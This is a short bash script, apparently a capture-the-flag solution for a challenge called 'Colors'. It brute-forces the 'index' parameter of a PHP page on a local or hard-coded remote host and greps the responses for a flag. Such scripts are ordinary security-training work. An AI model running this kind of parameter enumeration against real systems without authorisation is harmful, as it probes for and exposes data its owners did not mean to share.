#!/bin/bash
PORT=30016

if [[ $1 == "local" ]]; then
  url='http://127.0.0.1:'$PORT
elif [[ $1 == "remote" ]] && [[ -z $2 ]]; then
  url='http://141.85.224.101:'$PORT
else
  url=$1':'$2
fi

# Colors
echo "Start exploit for Colors"
url=$url'/index.php?index='
for i in {3000..4000}; do
  flag=$(curl -s $url$i | grep -o "SSS{.*}")
  if [[ ! -z $flag ]]; then
    break
  fi
done
echo "Flag is $flag"
echo "----------------------------"
